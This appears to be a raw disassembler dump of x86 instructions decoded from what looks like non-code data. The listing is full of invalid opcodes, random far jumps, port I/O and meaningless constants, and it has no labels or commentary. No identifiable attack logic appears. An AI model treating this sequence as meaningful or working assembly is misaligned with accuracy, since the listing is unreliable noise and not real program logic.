  426d68:	mov    al,0x9d
  426d6a:	clc    
  426d6b:	push   ebp
  426d6c:	je     0x426dc1
  426d6e:	ss pop ebx
  426d70:	repnz lods al,BYTE PTR gs:[esi]
  426d73:	shl    DWORD PTR [edx-0x7b1b95e],1
  426d79:	test   eax,0xe5724c3f
  426d7e:	jg     0x426d9d
  426d80:	cmp    ecx,ebx
  426d82:	push   ds
  426d83:	jo     0x426d7b
  426d85:	das    
  426d86:	(bad)  
  426d87:	aam    0xb3
  426d89:	dec    esi
  426d8a:	and    cl,BYTE PTR [esi+0x679515f3]
  426d90:	mov    ah,0x1e
  426d92:	jle    0x426d2c
  426d94:	add    bl,BYTE PTR [ebp+0x3d10d673]
  426d9a:	jns    0x426d33
  426d9c:	mov    ds,WORD PTR [esi+ebp*2-0x13]
  426da0:	jns    0x426de9
  426da2:	mov    esi,0x6ed0e73d
  426da7:	jne    0x426d75
  426da9:	or     al,0x5e
  426dab:	push   ds
  426dac:	add    eax,edi
  426dae:	add    edi,DWORD PTR [ebx-0x5b285c0e]
  426db4:	out    dx,al
  426db5:	outs   dx,DWORD PTR ds:[esi]
  426db6:	inc    esi
  426db7:	fwait
  426db8:	xor    DWORD PTR [ecx+0x8],edi
  426dbb:	ins    DWORD PTR es:[edi],dx
  426dbc:	mov    ds,WORD PTR [edi+edi*1-0x48]
  426dc0:	imul   eax,DWORD PTR [eax],0xa4a96deb
  426dc6:	js     0x426d4e
  426dc8:	fs add al,ah
  426dcb:	jp     0x426df4
  426dcd:	mov    al,ds:0x2c55908c
  426dd2:	dec    edx
  426dd3:	inc    esi
  426dd4:	push   ebp
  426dd5:	scas   al,BYTE PTR es:[edi]
  426dd6:	jo     0x426e56
  426dd8:	in     eax,dx
  426dd9:	pop    edi
  426dda:	adc    al,0x5e
  426ddc:	xor    eax,0xd254b2f5
  426de1:	and    eax,0x4a
  426de4:	mov    eax,ds:0x5ef7439c
  426de9:	add    DWORD PTR [ebx],edi
  426deb:	ja     0x426e4b
  426ded:	add    ah,al
  426def:	popa   
  426df0:	fmul   st,st(7)
  426df2:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  426df4:	leave  
  426df5:	pushw  ds
  426df7:	jmp    0x9582:0xe7befa89
  426dfe:	sbb    eax,0x335d1980
  426e03:	mov    bl,0xa6
  426e05:	dec    ebx
  426e06:	mov    eax,ds:0x342692ae
  426e0b:	imul   BYTE PTR [eax]
  426e0d:	jbe    0x426e0f
	...
  426e17:	add    BYTE PTR [eax],al
  426e19:	add    BYTE PTR [esi-0x28ab281c],dh
  426e1f:	ja     0x426dd8
  426e21:	out    0x39,al
  426e23:	(bad)  
  426e24:	push   ebx
  426e25:	lahf   
  426e26:	pop    esp
  426e27:	adc    ecx,eax
  426e29:	sahf   
  426e2a:	inc    esp
  426e2b:	in     al,0x1
  426e2d:	add    ah,bh
  426e2f:	add    DWORD PTR [eax],eax
  426e31:	add    BYTE PTR [esi+0x49],cl
  426e34:	or     ecx,ebp
  426e36:	loop   0x426e3e
  426e38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426e39:	pop    eax
  426e3a:	adc    esi,edx
  426e3c:	outs   dx,DWORD PTR ds:[esi]
  426e3d:	mov    WORD PTR [esi-0x28b73344],ds
  426e43:	cmp    BYTE PTR [edx-0x6a1c77d5],bh
  426e49:	fisubr WORD PTR [ebp-0x31]
  426e4c:	pop    edi
  426e4d:	pop    edi
  426e4e:	inc    ecx
  426e4f:	push   ss
  426e50:	cli    
  426e51:	pop    edi
  426e52:	xchg   edi,eax
  426e53:	xchg   BYTE PTR [eax+ecx*4-0x9],ch
  426e57:	data16 in al,0x61
  426e5a:	push   ebx
  426e5b:	cmp    DWORD PTR [esp+eiz*2],ecx
  426e5e:	add    dl,bl
  426e60:	xor    bh,ch
  426e62:	(bad)  
  426e63:	fcmovnbe st,st(1)
  426e65:	sahf   
  426e66:	xor    DWORD PTR [esi-0x15],0xfffffff8
  426e6a:	sbb    ebp,DWORD PTR [esi-0x68]
  426e6d:	aam    0x63
  426e6f:	es add al,0x8c
  426e72:	cmc    
  426e73:	xor    edx,DWORD PTR [ecx-0x17]
  426e76:	mov    ecx,0xe33e76c8
  426e7b:	jmp    0xdfa:0x2152dc5f
  426e82:	inc    ecx
  426e83:	pop    edi
  426e84:	in     al,dx
  426e85:	inc    eax
  426e86:	inc    ecx
  426e87:	loope  0x426e80
  426e89:	xchg   ecx,eax
  426e8a:	addr16 mov al,0x58
  426e8d:	loop   0x426e5a
  426e8f:	jae    0x426e86
  426e91:	sbb    DWORD PTR [ecx+0x5a9591b8],esi
  426e97:	dec    edi
  426e98:	ret    0x55a6
  426e9b:	lock xor DWORD PTR [eax-0x48],0xffffffbc
  426ea0:	retf   0x1419
  426ea3:	mov    dh,0xe3
  426ea5:	and    al,0x29
  426ea7:	xor    bh,bl
  426ea9:	cmp    DWORD PTR [edi],0xffffffde
  426eac:	xor    BYTE PTR [eax-0x6b],al
  426eaf:	mov    ebp,0x69a54f77
  426eb4:	cli    
  426eb5:	pop    esp
  426eb6:	leave  
  426eb7:	cs dec ebp
  426eb9:	pop    edx
  426eba:	mov    ds:0x61b48680,eax
  426ebf:	or     dl,BYTE PTR [esi+ebp*4-0x2a]
  426ec3:	loope  0x426e81
  426ec5:	ficomp DWORD PTR [ebx+ecx*2+0x42]
  426ec9:	push   ss
  426eca:	push   ss
  426ecb:	pop    esp
  426ecc:	lods   eax,DWORD PTR ds:[esi]
  426ecd:	mov    ebp,0x51fce73e
  426ed2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426ed3:	xor    DWORD PTR [edx],edi
  426ed5:	xor    cl,ah
  426ed7:	push   edx
  426ed8:	sbb    bl,BYTE PTR [eax+0x7caffd6e]
  426ede:	fs pop ss
  426ee0:	mov    ah,0x4f
  426ee2:	call   FWORD PTR [ebx-0x66]
  426ee5:	out    0x5e,al
  426ee7:	ins    BYTE PTR es:[edi],dx
  426ee8:	ror    BYTE PTR [edi+0x14],1
  426eeb:	in     eax,0x95
  426eed:	icebp  
  426eee:	mov    esi,esp
  426ef0:	xchg   eax,eax
  426ef2:	fs pop esp
  426ef4:	inc    ebp
  426ef5:	in     eax,dx
  426ef6:	xor    ecx,ecx
  426ef8:	pop    edi
  426ef9:	sbb    BYTE PTR [eax-0x3a],ch
  426efc:	nop
  426efd:	cmp    eax,0x81eb9b09
  426f02:	test   al,0x76
  426f04:	jmp    0xdad7c368
  426f09:	dec    eax
  426f0a:	jnp    0x426f72
  426f0c:	retf   
  426f0d:	mov    ?,WORD PTR [esi-0x2355eebe]
  426f13:	fwait
  426f14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f15:	test   eax,0x7988a8d4
  426f1a:	mov    al,ds:0x23c2b2e1
  426f1f:	(bad)  
  426f20:	fld    QWORD PTR [ebx+0x45]
  426f23:	es leave 
  426f25:	inc    eax
  426f26:	in     al,dx
  426f27:	xchg   DWORD PTR [edi+0x156fcdc8],edi
  426f2d:	jge    0x426ebe
  426f2f:	es sbb ax,0xc211
  426f34:	mov    edx,0x556de083
  426f39:	xchg   DWORD PTR [esi],ebx
  426f3b:	dec    esi
  426f3c:	test   ah,0x93
  426f3f:	loopne 0x426faf
  426f41:	push   0x48279e29
  426f46:	xchg   edx,eax
  426f47:	mov    ds:0xe4de2ff8,eax
  426f4c:	js     0x426f62
  426f4e:	loope  0x426ed0
  426f50:	lea    esi,[ecx-0x56]
  426f53:	sahf   
  426f54:	sbb    DWORD PTR [edx+0x65],esi
  426f57:	pop    esp
  426f58:	or     eax,0xa5715e8f
  426f5d:	cmp    eax,0x21483561
  426f62:	mov    bl,0xa0
  426f64:	ret    
  426f65:	push   ds
  426f66:	mov    esp,0xe89aed29
  426f6b:	loopne 0x426f12
  426f6d:	push   cs
  426f6e:	push   ds
  426f6f:	mov    esi,0x14de24f8
  426f74:	dec    esp
  426f75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f76:	sub    ah,dl
  426f78:	mov    esp,0x621a7fa8
  426f7d:	test   al,0x40
  426f7f:	xor    BYTE PTR [ebx-0x335815ff],0xff
  426f86:	pop    edi
  426f87:	xchg   esi,eax
  426f88:	loopne 0x426fd0
  426f8a:	dec    ebp
  426f8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426f8c:	sub    al,0xb1
  426f8e:	adc    eax,0x5d54821f
  426f93:	add    al,0xb4
  426f95:	repz and DWORD PTR [ecx],esi
  426f98:	mul    ecx
  426f9a:	xchg   BYTE PTR [ecx+0x43],cl
  426f9d:	inc    ebp
  426f9e:	or     bl,BYTE PTR [edx-0x2fcd1596]
  426fa4:	shl    BYTE PTR [edx-0x60ddf3ee],0x18
  426fab:	mov    al,0x36
  426fad:	fimul  DWORD PTR [ebp+0x76]
  426fb0:	xchg   edi,eax
  426fb1:	add    DWORD PTR [ecx-0x48],ebx
  426fb4:	dec    eax
  426fb5:	sbb    BYTE PTR ds:0xbe5813f9,cl
  426fbb:	add    eax,0x8125a17b
  426fc0:	mov    dl,0xe5
  426fc2:	and    al,0x5c
  426fc4:	or     bh,bh
  426fc6:	mov    DWORD PTR [eax+0x1339c62],edi
  426fcc:	retf   0x2488
  426fcf:	push   ecx
  426fd0:	push   esi
  426fd1:	xchg   edx,eax
  426fd2:	nop
  426fd3:	aaa    
  426fd4:	push   ebx
  426fd5:	fstp   DWORD PTR [edi-0x744e57a3]
  426fdb:	xor    bl,BYTE PTR [esi+0x49]
  426fde:	push   ss
  426fdf:	mov    ebp,0x86722350
  426fe4:	repnz lahf 
  426fe6:	pop    es
  426fe7:	sub    ebp,DWORD PTR [edx+0x2b8f9212]
  426fed:	and    eax,0xc5906521
  426ff2:	repnz jmp 0x4306:0xf103a7dc
  426ffa:	xlat   BYTE PTR ds:[ebx]
  426ffb:	inc    esi
  426ffc:	popa   
  426ffd:	adc    esp,ecx
  426fff:	push   cs
  427000:	and    ah,BYTE PTR [ebx+0x74]
  427003:	cmp    ah,bl
  427005:	iret   
  427006:	adc    BYTE PTR [ebx-0x559798f8],0x49
  42700d:	pop    ebx
  42700e:	mov    eax,ds:0x30ab64e2
  427013:	sbb    al,0x9d
  427015:	mov    dh,0xab
  427017:	adc    BYTE PTR [esi+0x33],cl
  42701a:	pop    ebx
  42701b:	imul   ebx,DWORD PTR [esi+edx*8-0x4936610b],0x27c5e400
  427026:	jmp    0x960c:0x44ddc8b3
  42702d:	dec    esp
	...
  42703a:	cli    
  42703b:	rcl    DWORD PTR ds:0xfac73d07,cl
  427041:	jmp    DWORD PTR [ecx-0x605bc2eb]
  427047:	push   edx
  427048:	push   cs
  427049:	pop    eax
  42704a:	inc    eax
  42704b:	out    0x1,al
  42704d:	add    ah,bh
  42704f:	add    DWORD PTR [eax],eax
  427051:	add    dh,al
  427053:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427054:	sub    BYTE PTR [ebx-0x715ca10f],dl
  42705a:	xor    BYTE PTR [esi+0x74],0x31
  42705e:	mov    ebp,0x968a4dad
  427063:	cmp    DWORD PTR [ecx],eax
  427065:	push   cs
  427066:	retf   
  427067:	fucomi st,st(7)
  427069:	aad    0x21
  42706b:	test   al,0xdf
  42706d:	addr16 mov edx,0xbd93903b
  427073:	(bad)
  427076:	adc    al,0x3d
  427078:	or     BYTE PTR [edx+ebp*4],dl
  42707b:	imul   edi,DWORD PTR [edx],0xffffffa8
  42707e:	lds    ecx,FWORD PTR [edi+0x19560cd9]
  427084:	test   al,0x49
  427086:	inc    edi
  427087:	cs xor al,0x8a
  42708a:	jne    0x4270c0
  42708c:	push   ds
  42708d:	xor    BYTE PTR [ebx-0x1d4a56fa],0xad
  427094:	enter  0x1dfe,0xc6
  427098:	pop    ds
  427099:	fcmovnu st,st(1)
  42709b:	jno    0x4270a6
  42709d:	retf   0xc95c
  4270a0:	mov    ds:0x91078998,eax
  4270a5:	outs   dx,DWORD PTR ds:[esi]
  4270a6:	add    esp,DWORD PTR [ecx]
  4270a8:	pusha  
  4270a9:	icebp  
  4270aa:	(bad)  [esi]
  4270ac:	out    0xf9,al
  4270ae:	inc    ebp
  4270af:	and    ebp,DWORD PTR [esi-0x2ef8c227]
  4270b5:	xchg   esi,eax
  4270b6:	ds xchg ebp,eax
  4270b8:	das    
  4270b9:	cmp    al,0x7c
  4270bb:	jmp    0x4270e8
  4270bd:	mov    ah,0xa
  4270bf:	and    ch,BYTE PTR [ecx-0x22619b15]
  4270c5:	add    ecx,DWORD PTR [ebp+0x573fe941]
  4270cb:	dec    ebp
  4270cc:	push   esp
  4270cd:	(bad)  
  4270ce:	sub    eax,edx
  4270d0:	and    BYTE PTR [ecx],cl
  4270d2:	pop    es
  4270d3:	fs ins BYTE PTR es:[edi],dx
  4270d5:	mov    al,ds:0x3f434b65
  4270da:	sub    dh,bh
  4270dc:	pushf  
  4270dd:	bound  edx,QWORD PTR [ebp+0x51]
  4270e0:	das    
  4270e1:	sbb    BYTE PTR [eax],dl
  4270e3:	inc    edi
  4270e4:	pusha  
  4270e5:	xor    al,0x41
  4270e7:	icebp  
  4270e8:	dec    esi
  4270e9:	loopne 0x4270d8
  4270eb:	stc    
  4270ec:	shl    DWORD PTR [ebp-0x178f1054],1
  4270f2:	dec    edx
  4270f3:	les    ecx,FWORD PTR [edx+ebx*8-0x7f]
  4270f7:	arpl   WORD PTR [eax+0x29bcff6],di
  4270fd:	(bad)  
  4270fe:	(bad)  
  4270ff:	fst    st(1)
  427101:	ret    0x74bc
  427104:	push   ebx
  427105:	xchg   edx,eax
  427106:	daa    
  427107:	sub    cl,bh
  427109:	push   0xffffffd5
  42710b:	iret   
  42710c:	hlt    
  42710d:	ror    DWORD PTR [edx],0xe6
  427110:	pop    es
  427111:	xor    DWORD PTR [esi],esp
  427113:	fs ret 
  427115:	aam    0xae
  427117:	pop    esp
  427118:	pop    ecx
  427119:	cs stos BYTE PTR es:[edi],al
  42711b:	aas    
  42711c:	stc    
  42711d:	lock jp 0x4270ab
  427120:	cmp    al,0xca
  427122:	outs   dx,DWORD PTR ds:[esi]
  427123:	shr    edx,cl
  427125:	sbb    edx,DWORD PTR [edx-0x19abd8ff]
  42712b:	dec    ebp
  42712c:	sbb    DWORD PTR [esi-0x4ee8585e],0x42fa265b
  427136:	retf   
  427137:	ret    
  427138:	fadd   st(2),st
  42713a:	xlat   BYTE PTR ds:[ebx]
  42713b:	pop    ebp
  42713c:	adc    eax,DWORD PTR [eax+0x63]
  42713f:	or     DWORD PTR [esp+esi*8+0x592f08d4],0x5a9097c0
  42714a:	inc    eax
  42714b:	sub    al,0x1b
  42714d:	cmp    eax,DWORD PTR [esp+esi*1+0x726db7ec]
  427154:	(bad)  
  427155:	and    ebp,DWORD PTR [edi+ebx*1+0x53]
  427159:	imul   ebx,DWORD PTR [edi-0x69],0x2649867c
  427160:	sbb    BYTE PTR [ebx+0x68455472],ch
  427166:	mov    ch,0x7
  427168:	in     eax,0x46
  42716a:	dec    ebx
  42716b:	pop    es
  42716c:	pop    edx
  42716d:	jb     0x42715e
  42716f:	test   bh,ch
  427171:	cmp    DWORD PTR ds:0x826d9db6,0xd
  427178:	popa   
  427179:	(bad)
  42717d:	inc    esp
  42717e:	mov    cl,0x57
  427180:	ins    DWORD PTR es:[edi],dx
  427181:	outs   dx,DWORD PTR ds:[esi]
  427182:	out    0x71,eax
  427184:	mov    edi,esp
  427186:	and    BYTE PTR [ebx-0x17],0xf7
  42718a:	cmp    bl,BYTE PTR [ebp-0x49437e23]
  427190:	in     al,dx
  427191:	mov    ds:0x45afaa26,eax
  427196:	adc    eax,0x77c60ff4
  42719b:	popf   
  42719c:	aad    0xa7
  42719e:	mov    ecx,0xd162fa50
  4271a3:	mov    cl,0xa7
  4271a5:	out    0x83,eax
  4271a7:	sbb    DWORD PTR [ebx],edx
  4271a9:	ret    0x57e
  4271ac:	dec    esi
  4271ad:	iret   
  4271ae:	xchg   esp,eax
  4271af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4271b0:	and    al,0xe
  4271b2:	sub    edi,0x69
  4271b5:	mov    DWORD PTR [ecx+0x3d],edi
  4271b8:	or     dl,BYTE PTR [esi+0x21]
  4271bb:	sbb    cl,BYTE PTR [ebp+0x63]
  4271be:	mov    ebx,0x8d0c56ec
  4271c3:	adc    DWORD PTR [eax+0x48],esi
  4271c6:	hlt    
  4271c7:	inc    DWORD PTR [edi]
  4271c9:	mov    esp,0xbd584e3b
  4271ce:	mov    dh,0x18
  4271d0:	dec    ecx
  4271d1:	bound  ebx,QWORD PTR [eax+0x5a]
  4271d4:	mov    bl,0x66
  4271d6:	mov    ds:0xae4cb913,al
  4271db:	jg     0x42725a
  4271dd:	mov    ebp,0xf95d74ef
  4271e2:	pop    ss
  4271e3:	xor    BYTE PTR [ebx+esi*2+0x5a],0x99
  4271e8:	fisub  WORD PTR [ebx-0x7882c4ec]
  4271ee:	xchg   ebx,eax
  4271ef:	daa    
  4271f0:	cmp    ch,cl
  4271f2:	sti    
  4271f3:	repz dec BYTE PTR [edx+0xda6bba9]
  4271fa:	jmp    0x53623396
  4271ff:	shl    DWORD PTR [ecx],1
  427201:	mov    ebx,0xcb505306
  427206:	push   edx
  427207:	pop    esi
  427208:	repz data16 ss hlt 
  42720c:	loopne 0x4271b2
  42720e:	pop    edi
  42720f:	sbb    eax,ebp
  427211:	or     edx,DWORD PTR [esi]
  427213:	or     DWORD PTR [esi-0x5f],esi
  427216:	inc    esp
  427217:	inc    ecx
  427218:	aam    0xbc
  42721a:	and    eax,0xf1db3dcc
  42721f:	push   ss
  427220:	cmp    eax,0x746311b4
  427225:	pop    ecx
  427226:	push   ebp
  427227:	aam    0xde
  427229:	mov    ds:0x6d61f92d,al
  42722e:	jle    0x42729f
  427230:	jae    0x42724b
  427232:	arpl   WORD PTR [esi+0x6f],di
  427235:	sub    BYTE PTR [ebx+0x79],dl
  427238:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427239:	sub    eax,0xa70c56a5
  42723e:	daa    
  42723f:	les    edi,FWORD PTR [edi-0x72ce3d53]
  427245:	imul   esi,eax,0x53
  427248:	xchg   edi,eax
  427249:	push   0xc1cb6efb
	...
  42725a:	iret   
  42725b:	neg    BYTE PTR [ebp-0x308442b0]
  427261:	(bad)  
  427262:	mov    ecx,0x11b02077
  427267:	aas    
  427268:	ins    DWORD PTR es:[edi],dx
  427269:	fnstsw WORD PTR [eax+ebp*8]
  42726c:	add    DWORD PTR [eax],eax
  42726e:	cld    
  42726f:	add    DWORD PTR [eax],eax
  427271:	add    BYTE PTR [ecx-0x7cf9e17c],al
  427277:	arpl   WORD PTR [ebx+0x71],bx
  42727a:	ins    DWORD PTR es:[edi],dx
  42727b:	push   esi
  42727c:	sbb    cl,al
  42727e:	fimul  WORD PTR [ecx]
  427280:	xor    al,0x88
  427282:	sbb    al,0x4e
  427284:	stos   BYTE PTR es:[edi],al
  427285:	sbb    eax,0x3c85f20c
  42728a:	adc    BYTE PTR [ebx],cl
  42728c:	jle    0x42729c
  42728e:	dec    eax
  42728f:	sahf   
  427290:	fsubr  DWORD PTR [ebp+0x3a0aeee3]
  427296:	popf   
  427297:	add    DWORD PTR [esi+ebx*2],0x57
  42729b:	cmp    eax,0xa2a70d56
  4272a0:	enter  0x74ad,0x30
  4272a4:	sahf   
  4272a5:	imul   ebp,DWORD PTR [ecx+0x40],0x51
  4272a9:	xchg   ebp,eax
  4272aa:	mov    ebx,0xc5a58ede
  4272af:	xor    eax,0x9df9ecf6
  4272b4:	jnp    0x427328
  4272b6:	push   ebp
  4272b7:	sub    al,0xfa
  4272b9:	and    al,bl
  4272bb:	sar    edx,0xf3
  4272be:	stc    
  4272bf:	inc    eax
  4272c1:	push   edi
  4272c2:	outs   dx,BYTE PTR ds:[esi]
  4272c3:	or     esi,DWORD PTR [edx+eax*8-0x610d146a]
  4272ca:	das    
  4272cb:	xchg   ecx,eax
  4272cc:	or     eax,0xb393c923
  4272d1:	cmp    ecx,DWORD PTR [esi+0x46]
  4272d4:	lea    eax,[ebx]
  4272d6:	das    
  4272d7:	pop    es
  4272d8:	mov    cl,0x4e
  4272da:	pop    ss
  4272db:	jns    0x42730f
  4272dd:	jp     0x4272df
  4272df:	fidiv  DWORD PTR [ebp+0x65]
  4272e2:	jo     0x4272b8
  4272e4:	mov    bh,0x54
  4272e6:	xchg   DWORD PTR [ebx+0x59],edi
  4272e9:	jae    0x4272b1
  4272eb:	popf   
  4272ec:	fs (bad) 
  4272ee:	outs   dx,BYTE PTR ds:[esi]
  4272ef:	sub    edx,DWORD PTR [ebp-0x2ed91988]
  4272f5:	imul   edx,DWORD PTR [edx+0x10dafda8],0x6c64f959
  4272ff:	dec    edx
  427300:	cmp    BYTE PTR [ecx+edi*4],ah
  427303:	fbld   TBYTE PTR [esi]
  427305:	sub    BYTE PTR [esi-0x6b],bh
  427308:	mov    esp,0xa513c304
  42730d:	adc    ecx,esp
  42730f:	push   edx
  427310:	jl     0x4272a9
  427312:	or     edi,0xfd7060
  427318:	aaa    
  427319:	fldenv [edx+0x487b7df7]
  42731f:	mov    ah,0x71
  427321:	div    BYTE PTR [ecx+0x3312fe32]
  427327:	sub    al,0x25
  427329:	bound  ebp,QWORD PTR [edi+0x63]
  42732c:	mov    esp,0xa225a4b5
  427331:	cli    
  427332:	mov    bl,0xa2
  427334:	ds out 0xba,eax
  427337:	inc    esp
  427338:	mov    esi,0x9cf16911
  42733d:	pushf  
  42733e:	std    
  42733f:	mov    DWORD PTR [ebx+0x20b27c21],eax
  427345:	pop    esp
  427346:	add    eax,0xbf1261c6
  42734b:	sbb    BYTE PTR [ebp+0x29],ch
  42734e:	ins    BYTE PTR es:[edi],dx
  42734f:	dec    BYTE PTR ds:0x13686a86
  427355:	into   
  427356:	pop    ss
  427357:	ds push esi
  427359:	xor    al,BYTE PTR [eax-0x32700faf]
  42735f:	scas   eax,DWORD PTR es:[edi]
  427360:	test   ch,0x5
  427363:	out    0x6d,eax
  427365:	pusha  
  427366:	jbe    0x427379
  427368:	arpl   WORD PTR [edi-0x4030473c],di
  42736e:	mov    dh,0x6c
  427370:	sub    DWORD PTR [esi+eiz*2-0x2555e4de],edi
  427377:	dec    edx
  427378:	inc    ecx
  427379:	pop    ss
  42737a:	adc    BYTE PTR [edx],ch
  42737c:	aad    0x31
  42737e:	cmp    eax,DWORD PTR [edx-0x4a6bee6a]
  427384:	xchg   ebx,eax
  427385:	mov    eax,ds:0xc3361129
  42738a:	sbb    DWORD PTR [ebx],esi
  42738c:	shl    BYTE PTR [esi+0x47],0xcf
  427390:	and    eax,0xff7fd31c
  427395:	pop    ebx
  427396:	and    DWORD PTR [ebx-0x59f56fcd],esi
  42739c:	fwait
  42739d:	xchg   edi,eax
  42739e:	imul   DWORD PTR [eax-0x39109d50]
  4273a4:	loopne 0x427388
  4273a6:	xor    BYTE PTR [eax+0x5dab1377],dh
  4273ac:	popf   
  4273ad:	(bad)  ds:0x26d64359
  4273b3:	pop    ebx
  4273b4:	shl    BYTE PTR [esi-0x1e],1
  4273b7:	fiadd  DWORD PTR ds:0x2de6fa6
  4273bd:	out    dx,eax
  4273be:	pushw  ds
  4273c0:	sbb    BYTE PTR [edx-0x5b6dfc23],ah
  4273c6:	add    BYTE PTR [edx-0x4bd5d0d0],ch
  4273cc:	and    al,al
  4273ce:	enter  0xd128,0x1e
  4273d2:	mov    edi,DWORD PTR [eax]
  4273d4:	or     DWORD PTR ds:0xb029521f,esp
  4273da:	mov    cl,0xa
  4273dc:	jnp    0x427442
  4273de:	ss sbb eax,0xe797255
  4273e4:	fwait
  4273e5:	inc    edi
  4273e6:	adc    esp,DWORD PTR [ebx]
  4273e8:	ret    0x1413
  4273eb:	js     0x427422
  4273ed:	push   ebx
  4273ee:	pop    ss
  4273ef:	jne    0x427412
  4273f1:	stc    
  4273f2:	ret    
  4273f3:	out    0x39,eax
  4273f5:	imul   ebp,esi,0xb33c1973
  4273fb:	jp     0x427479
  4273fd:	push   esp
  4273fe:	sbb    al,0xc6
  427400:	xchg   ecx,eax
  427401:	lods   eax,DWORD PTR ds:[esi]
  427402:	xor    BYTE PTR [ebx-0x36251ea4],cl
  427408:	push   es
  427409:	push   esp
  42740a:	pusha  
  42740b:	or     DWORD PTR [ecx+ebx*2+0x22],0xffffffd7
  427410:	mov    eax,ds:0xefee3a9
  427415:	adc    BYTE PTR [ebx+esi*8-0x67],ah
  427419:	fdivr  DWORD PTR [esi+0x5a7d7fbd]
  42741f:	mov    ecx,DWORD PTR [eax+0x7e7ada56]
  427425:	push   eax
  427426:	fidiv  WORD PTR [ecx-0x52a72b8e]
  42742c:	shl    DWORD PTR [edx+ebx*2-0x11],cl
  427430:	inc    edi
  427431:	repz add ebx,0xd1b6088e
  427438:	cwde   
  427439:	push   ecx
  42743a:	mov    ebp,0xf7bfcb7f
  42743f:	or     ah,cl
  427441:	ins    DWORD PTR es:[edi],dx
  427442:	xor    dh,ah
  427444:	add    BYTE PTR [ecx],cl
  427446:	daa    
  427447:	or     edi,DWORD PTR [esi+0x5e5f7a79]
  42744d:	inc    esi
  42744e:	add    BYTE PTR [ebx-0x74de633a],0xaa
  427455:	and    BYTE PTR [edi-0x3a],ah
  427458:	jnp    0x42743f
  42745a:	mov    ch,bh
  42745c:	stc    
  42745d:	loope  0x427426
  42745f:	inc    eax
  427460:	cmp    BYTE PTR [ecx-0x5e5eea02],0xa5
  427467:	adc    al,0xdd
  427469:	push   edx
  42746a:	dec    eax
  42746b:	adc    BYTE PTR [edx-0x28],bh
	...
  42747a:	push   0x6f1e2d23
  42747f:	push   ds
  427480:	jnp    0x4274f9
  427482:	outs   dx,DWORD PTR ds:[esi]
  427483:	jno    0x4274a3
  427485:	dec    esi
  427486:	cmp    DWORD PTR [ebp-0x15c72b42],ecx
  42748c:	add    DWORD PTR [eax],eax
  42748e:	cld    
  42748f:	add    DWORD PTR [eax],eax
  427491:	add    BYTE PTR [edi+0x44],dl
  427494:	adc    DWORD PTR [eax+edx*2-0x16a8d6bb],eax
  42749b:	inc    edi
  42749c:	jg     0x4274e8
  42749e:	cmp    eax,DWORD PTR [esi]
  4274a0:	stos   BYTE PTR es:[edi],al
  4274a1:	and    DWORD PTR [ecx+ebx*1-0x50],edi
  4274a5:	dec    ebx
  4274a6:	cmp    ebx,esp
  4274a8:	add    cl,BYTE PTR [eax+0x50]
  4274ab:	std    
  4274ac:	xchg   esp,eax
  4274ad:	jmp    DWORD PTR [ecx+edx*1+0x1a0aff21]
  4274b4:	pushf  
  4274b5:	or     al,0x71
  4274b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4274b8:	in     al,0x1d
  4274ba:	add    BYTE PTR [edi+0x3762880e],ah
  4274c0:	out    dx,al
  4274c1:	xchg   esp,eax
  4274c2:	pusha  
  4274c3:	aaa    
  4274c4:	das    
  4274c5:	mul    BYTE PTR [edx-0x20]
  4274c8:	push   bx
  4274ca:	sbb    esi,DWORD PTR ds:0x787ccb33
  4274d0:	mov    edi,0x625c87f7
  4274d5:	and    esp,0x2c
  4274d8:	in     eax,0xc9
  4274da:	cmp    DWORD PTR [esi-0x6b],ebx
  4274dd:	and    edx,DWORD PTR [ebx+edx*4+0x56]
  4274e1:	fistp  DWORD PTR [esi]
  4274e3:	call   0x7d0d:0x777df179
  4274ea:	mov    BYTE PTR [edi+0x7ea112be],bh
  4274f0:	adc    al,0x4a
  4274f2:	xor    eax,0x93f84e21
  4274f7:	adc    DWORD PTR [ecx+esi*8],ebp
  4274fa:	aad    0xc
  4274fc:	fcom   QWORD PTR [ebx-0x25]
  4274ff:	test   al,0x1
  427501:	sar    DWORD PTR [edx+0x7c],1
  427504:	mov    edi,0x8e2a94a0
  427509:	sar    DWORD PTR [eax],0x36
  42750c:	jecxz  0x427578
  42750e:	ins    BYTE PTR es:[edi],dx
  42750f:	pop    ebp
  427510:	xchg   ebx,eax
  427511:	inc    DWORD PTR [ebp-0x49]
  427514:	sbb    edx,ecx
  427516:	cmp    DWORD PTR cs:[ecx-0x19],0x70cad4d
  42751e:	sbb    BYTE PTR [edx-0x5],ah
  427521:	pop    ebx
  427522:	jmp    0xbe7b037d
  427527:	adc    ebp,DWORD PTR [ebp+0xffa5167]
  42752d:	daa    
  42752e:	loop   0x42759a
  427530:	(bad)  
  427531:	out    0x9c,eax
  427533:	scas   eax,DWORD PTR es:[edi]
  427534:	fmul   DWORD PTR [ebp-0x44]
  427537:	pop    ss
  427538:	xor    ecx,DWORD PTR [ebp-0x6c3309f3]
  42753e:	imul   eax,DWORD PTR [eax],0x943285d5
  427544:	hlt    
  427545:	cmp    ah,BYTE PTR [ebx]
  427547:	sbb    DWORD PTR [ecx-0x1cbaed38],edx
  42754d:	adc    eax,0x2de74232
  427552:	ds jmp 0xef55b8c3
  427558:	test   BYTE PTR [esi-0x13],cl
  42755b:	and    DWORD PTR [ebp+ebx*2+0x2b],ecx
  42755f:	push   esi
  427560:	imul   edx,DWORD PTR ds:0x2d485bcc,0xffffffca
  427567:	sti    
  427568:	pop    esi
  427569:	jl     0x4275cf
  42756b:	pop    ds
  42756c:	iret   
  42756d:	(bad)  
  42756e:	push   esi
  42756f:	inc    ebx
  427570:	loopne 0x427546
  427572:	rcr    DWORD PTR [edi-0x7c0967c0],1
  427578:	cli    
  427579:	das    
  42757a:	and    DWORD PTR [esi+0x52c3417c],ebx
  427580:	in     eax,dx
  427581:	push   esp
  427582:	dec    ebx
  427583:	inc    ebp
  427584:	sbb    edi,ebx
  427586:	ror    DWORD PTR cs:[ebx],cl
  427589:	cwde   
  42758a:	add    al,0xad
  42758c:	lea    edx,gs:[ebp-0xc]
